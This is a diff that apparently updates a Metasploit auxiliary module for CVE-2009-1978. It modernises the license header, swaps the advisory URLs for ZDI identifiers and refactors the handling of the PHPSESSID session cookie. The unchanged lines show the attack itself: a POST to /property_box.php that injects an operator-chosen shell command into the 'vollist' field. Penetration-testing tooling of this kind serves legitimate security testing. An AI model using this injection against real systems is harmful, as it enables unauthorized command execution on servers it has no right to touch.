@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -28,8 +26,8 @@ class Metasploit3 < Msf::Auxiliary
           [ 'OSVDB', '55903' ],
           [ 'CVE', '2009-1978' ],
           [ 'OSVDB', '55904' ],
-          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-058' ],
-          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-09-059' ],
+          [ 'ZDI', '09-058' ],
+          [ 'ZDI', '09-059' ],
         ],
       'DisclosureDate' => 'Aug 18 2009'))
 
@@ -51,9 +49,7 @@ class Metasploit3 < Msf::Auxiliary
         'method' => 'POST',
       }, 5)
 
-      if (res and res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/PHPSESSID=(.*);(.*)/i))
-
-        sessionid = res.headers['Set-Cookie'].split(';')[0]
+      if res && res.get_cookies.match(/PHPSESSID=(.*);(.*)/i)
 
           print_status("Sending command: #{datastore['CMD']}...")
 
@@ -61,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
             {
               'uri'	=> '/property_box.php',
               'data'  => 'type=Sections&vollist=75' + Rex::Text.uri_encode("&" + cmd),
-              'cookie' => sessionid,
+              'cookie' => res.get_cookies,
               'method' => 'POST',
             }, 5)
 
